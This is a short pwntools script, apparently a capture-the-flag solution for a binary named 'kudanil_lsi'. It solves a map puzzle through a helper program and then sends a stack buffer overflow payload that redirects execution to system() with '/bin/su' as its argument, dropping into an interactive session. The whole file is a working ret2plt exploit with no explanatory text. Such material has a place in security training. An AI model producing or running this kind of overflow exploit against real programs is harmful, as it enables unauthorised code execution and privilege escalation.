from pwn import *
from subprocess import check_output as co
p = process("./kudanil_lsi")
p.sendline("")
e = ELF('./kudanil_lsi')

binsu = next(e.search('/bin/su'))
system_plt = e.plt['system']

s = p.recvuntil("su")

s = s.split("\n")[-11:]

s = "\n".join(s)
print s
f = open('map','w')
f.write(s)
f.close()
solution = co('cat map | ./map.solution', shell=True)

for c in range(0, len(solution)):
	p.sendline(solution[c])

payload = "A"*23 + p32(system_plt) + 'BBBB' + p32(binsu)
p.sendline(payload)
p.interactive()
